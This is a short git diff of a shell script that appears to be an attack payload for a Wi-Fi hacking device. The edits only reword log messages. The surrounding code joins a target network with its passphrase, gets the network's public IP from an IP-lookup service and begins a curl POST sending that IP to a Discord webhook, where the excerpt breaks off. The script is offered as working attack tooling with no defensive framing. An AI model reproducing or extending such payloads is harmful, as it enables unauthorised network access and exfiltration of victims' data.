@@ -109,7 +109,7 @@ LOG green "$MAPSSID shutdown complete!"
 sleep 1.5
 
 # Get on network:
-spinner3=$(START_SPINNER "Connecting to $TARGETSSID..")
+spinner3=$(START_SPINNER "Connecting to: $TARGETSSID..")
     WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
     LANCONNECTED="false"
     for i in {1..12}; do
@@ -124,12 +124,12 @@ spinner3=$(START_SPINNER "Connecting to $TARGETSSID..")
 STOP_SPINNER "${spinner3}"
 
 if [ "$LANCONNECTED" != "true" ]; then
-    ALERT "Could not connect to $TARGETSSID!"
+    ALERT "Could not connect to: $TARGETSSID!"
     LOG red "Exiting."
     exit 0
 fi
 
-LOG green "Connected to $TARGETSSID!"
+LOG green "Connected to: $TARGETSSID!"
 sleep 1.5
 
 # Check for internet connectvity:
@@ -143,7 +143,7 @@ for i in {1..12}; do
     if INETCHECK; then
 	    LOG green "Internet connection available!"
         sleep 1.5
-        LOG blue "Sending target network: $TARGETSSID WAN IP to Discord webhook.."
+        LOG blue "Sending $TARGETSSID WAN IP to Discord webhook.."
         PIP=$(curl -s https://api.ipify.org)
         curl -H "Content-Type: application/json" \
         -X POST \
